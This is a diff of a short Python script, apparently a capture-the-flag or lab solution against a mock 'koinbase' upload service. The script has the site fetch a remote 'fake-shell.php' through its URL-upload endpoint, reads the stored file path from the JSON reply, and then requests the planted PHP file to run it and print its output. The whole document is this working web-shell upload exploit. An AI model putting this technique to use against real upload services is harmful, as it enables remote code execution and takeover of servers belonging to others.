@@ -1,5 +1,16 @@
 import urllib.request
-url = "https://upload.koinbase.cyberjutsu-lab.tech/upload/7e35b846f74f13ae.php"
-contents = urllib.request.urlopen(url).read()
-if contents:
-    print(str(contents).replace("\\n", "\n"))
+import urllib.parse
+import json
+
+image_url = urllib.parse.quote(
+    "https://github.com/xuantungmta/test/raw/main/test/fake-shell.php")
+url = "https://upload.koinbase.cyberjutsu-lab.tech/index.php?url=" + image_url
+response = urllib.request.urlopen(url)
+if response:
+    response = json.load(response)
+    # print(response)
+    url_payload = "https://upload.koinbase.cyberjutsu-lab.tech/" + \
+        response['message']
+    contents = urllib.request.urlopen(url_payload).read()
+    if contents:
+        print(str(contents).replace("\\n", "\n"))
